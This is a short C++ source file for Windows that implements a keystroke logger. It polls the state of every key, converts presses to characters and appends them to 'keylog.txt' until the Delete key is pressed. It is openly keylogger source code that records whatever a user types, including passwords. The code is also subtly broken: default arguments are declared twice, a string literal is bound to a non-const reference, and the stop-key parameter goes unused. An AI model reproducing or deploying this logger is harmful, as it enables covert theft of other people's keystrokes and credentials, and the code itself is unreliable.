#include <iostream>
#include <windows.h>
#include <fstream>

#include "keySniffLibrary.h"

#pragma comment(lib, "user32.lib")

void sniff_keys(std::string &logfile, const int stopKey = 0x2E, const bool verbose = false);

int main()
{
    // // Open the file to log keys
    // std::ofstream logfile;
    // logfile.open("keylog.txt", std::ios::app);

    // // Check if file opened successfully
    // if (!logfile.is_open())
    // {
    //     MessageBox(NULL, "Unable to open log file!", "Error", MB_ICONERROR);
    //     return 1;
    // }
    sniff_keys("keylog.txt");
    return 0;
}

void sniff_keys(std::string logfilePath = "keyLog.txt", const int stopKey = 0x2E, const bool verbose = false)
{

    // Create file if not already created
    std::ofstream logfile;
    logfile.open(logfilePath, std::ios::app);
    if (!logfile.is_open())
    {
        throw std::ios_base::failure("Failed to open the Keylogger log file" + logfilePath);
    }

    bool isSniffing = true;
    while (isSniffing)
    {

        // Loop through all possible key codes (0x08 to 0xFF)
        for (int key = 0x08; key <= 0xFF; key++)
        {
            // Check if the key is pressed
            if (GetAsyncKeyState(key) & 0x8000)
            {

                if (key == 0x2E)
                {
                    isSniffing = false;
                }

                BYTE keyboardState[256];
                GetKeyboardState(keyboardState); // Get the state of all keys

                // Translate virtual key to ASCII
                char buffer[2] = {0}; // To hold the translated character
                bool isSucceeded = ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, (LPWORD)buffer, 0) == 1;
                if (isSucceeded)
                {

                    // Log the character to the file
                    logfile << buffer[0];
                    logfile.flush(); // Flush after every key press
                    if (verbose)
                    {
                        std::cout << buffer << std::endl;
                    }
                }
            }
        }

        // Add a small delay to reduce CPU usage
        Sleep(50);
    }
    std::cout << "\n";
    std::cout << "Stopped sniffing!";
};